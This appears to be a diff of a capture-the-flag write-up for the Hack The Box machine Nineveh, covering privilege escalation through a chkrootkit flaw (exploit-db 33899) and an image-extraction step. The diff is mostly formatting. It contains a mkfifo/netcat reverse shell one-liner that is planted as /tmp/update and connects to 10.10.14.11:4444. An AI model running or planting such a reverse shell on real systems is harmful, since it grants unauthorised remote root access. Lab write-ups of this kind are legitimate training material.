@@ -96,16 +96,17 @@ www-data@nineveh:/var/tmp$ ./procmon.sh
 < ps -eo command
 ...
 ```
---------------------------------------------------------------------
-"< /bin/sh /usr/bin/chkrootkit" finds exploit-db 33899
-Then create a update file placed /tmp as /tmp/update
-"/3"--> as Third terminal!
+### "< /bin/sh /usr/bin/chkrootkit" finds exploit-db 33899
+### Then create a update file placed /tmp as /tmp/update
+### "/3"--> as Third terminal!
+```shell
 --------------------------------------------------------------------
 #!/bin/bash
 rm /tmp/3;mkfifo /tmp/3;cat /tmp/3|/bin/sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/3
 --------------------------------------------------------------------
-
-~Other way~
+```
+#### ~Other way~
+https://10.10.10.43/secure_notes/
 Show hidden content: 
 root@kali:~/HTB/Nineveh# binwalk -Me nineveh.png 
 ...
